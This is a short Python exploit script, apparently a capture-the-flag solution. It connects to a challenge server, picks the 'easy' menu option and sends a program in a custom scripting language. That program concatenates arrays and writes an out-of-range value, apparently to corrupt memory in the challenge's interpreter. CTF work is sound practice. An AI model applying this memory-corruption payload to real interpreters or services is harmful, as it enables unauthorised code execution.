#!/usr/bin/env python3
import socket, sys, time

HOST = "0.cloud.chals.io"
PORT = 24814

PAYLOAD = b"""fn dummy() {
    return 0;
}

let a = array(1);
let b = array(65535);
let c = concat(a, b);

register(dummy);

c[1] = 0x4010000;

print(1337);
__EOF__
"""

def recv_until_quiet(s, timeout=3):
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data

s = socket.create_connection((HOST, PORT))
print(recv_until_quiet(s).decode(errors="replace"))

# responde o menu (easy)
s.sendall(b"1\n")
time.sleep(0.5)
print(recv_until_quiet(s).decode(errors="replace"))

# agora manda o programa
s.sendall(PAYLOAD)
time.sleep(2)
out = recv_until_quiet(s, timeout=10)
print(out.decode(errors="replace"))
s.close()